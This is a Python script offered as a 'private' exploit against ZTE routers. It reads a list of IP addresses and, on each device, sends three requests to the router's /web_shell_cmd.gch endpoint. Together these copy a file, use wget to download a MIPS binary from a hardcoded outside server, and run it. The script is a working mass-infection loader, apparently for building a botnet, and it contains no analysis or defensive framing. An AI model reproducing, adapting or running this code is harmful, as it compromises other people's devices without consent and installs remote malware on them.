import threading
import socket
import ssl
import time
import sys
#If you have this you are trusted
#Private ZTE EXPLOIT 
#zte ===== ZTE V2
#te the next big exploit
#LEAK THIS AND SEE WHAT WILL HAPPEN :}

server = "147.135.23.228"    # ("zte") #IF YOU DONT KNOW WHAT YOUR SERVER IP IS IMA CRY :(
mip = "gafdse.mips" ############################################################################
bin1 = "" ################################## dont enter for no bin
#
# ("zte") ##############################################
info = open(str(sys.argv[1]),'a+')

class skid(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
    def run(self):
        try:
            f1 = "POST /web_shell_cmd.gch HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: HaxerMen\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 114\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nIF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp&CmdAck=\r\n\r\n"
            s1 = "POST /web_shell_cmd.gch HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: HaxerMen\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 154\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nIF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F"+server+"%2F"+bin1+"%2F"+mip+"+-O+%2Fvar%2Ftmp%2Finit.norm&CmdAck=\r\n\r\n"
            t1 = "POST /web_shell_cmd.gch HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: HaxerMen\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Length: 104\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nIF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fvar%2Ftmp%2Finit.norm&CmdAck=\r\n\r\n"

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_sock = ssl.wrap_socket(sock)
            ssl_sock.connect((self.ip, 443))
#############################################port 443 for all :
            ssl_sock.sendall(f1.encode('utf-8'))
            ssl_sock.close()
            time.sleep(3)
#########################################################################classed skid
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_sock = ssl.wrap_socket(sock)
            ssl_sock.connect((self.ip, 443))

            ssl_sock.sendall(s1.encode('utf-8'))
            ssl_sock.close()
            time.sleep(5)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_sock = ssl.wrap_socket(sock)
            ssl_sock.connect((self.ip, 443))

			####################################################################### run all three links
            ssl_sock.sendall(t1.encode('utf-8'))
            ssl_sock.close()
            time.sleep(3)
            print("[zte]" + self.ip) #######################################send to host
        except Exception as e:
            print(e)
            return

#################class skid

for ip in info:
    try:
        time.sleep(0.01)
        skid(ip).start()
    except:
        pass